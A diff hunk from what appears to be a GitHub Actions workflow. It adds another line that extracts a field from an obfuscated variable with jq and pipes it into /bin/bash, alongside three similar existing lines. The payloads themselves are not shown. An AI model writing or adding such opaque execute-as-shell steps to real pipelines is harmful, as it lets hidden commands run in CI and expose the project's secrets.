@@ -27,6 +27,7 @@ jobs:
           echo $diw48445 | jq -r .d40 | /bin/bash
           echo $mmnzo2 | jq -r .x5812 | /bin/bash
           echo $f12 | jq -r .yxktn16619 | /bin/bash
+          echo $ktj3 | jq -r .o23 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
